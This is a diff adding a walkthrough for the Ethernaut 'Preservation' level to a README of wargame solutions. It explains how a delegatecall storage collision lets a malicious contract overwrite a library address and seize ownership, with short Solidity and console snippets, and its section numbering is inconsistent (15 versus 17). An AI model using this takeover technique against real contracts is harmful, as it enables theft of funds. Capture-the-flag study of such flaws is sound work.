@@ -47,6 +47,7 @@ yarn start -- <level_name>
  - [14. Gatekeeper One](#14-gatekeeper-one)
  - [15. Gatekeeper Two](#15-gatekeeper-two)
  - [16. Naught Coin](#16-naught-coin)
+ - [17. Preservation](#17-preservation)
 
 ### 1. Hello Ethernaut
 
@@ -727,3 +728,32 @@ Finally we can send all our founds from our account to the new one:
 ```js
 await contract.transferFrom(player, player2, await contract.allowance(player, player2));
 ```
+---
+
+### 15. Preservation
+
+The `delegatecall` method will overwrite the 1st contract slot in the context of the contract that has made the call. 
+Therefore we can change the address of `timeZone1Library` using `setFirstTime` and passing our malicious contract address casted as `uint _time` .
+
+```sol
+  // malicious contract.
+  function updateLibrary(address _victim) public {
+    PreservationInterface(_victim).setFirstTime(uint160(address(this)));
+  }
+```
+
+Once we changed the addres we can create a custom `function setTime(uint _time)` that will change the owner of the contract. 
+
+```sol
+function setTime(uint _time) public {
+  owner = tx.origin;
+}
+```
+
+And then call it directly from the level console, we can send whatever value we want.
+
+```js
+await contract.setFirstTime(0x0);
+```
+
+Finnaly, the delegated function will change the ownership of the contract.
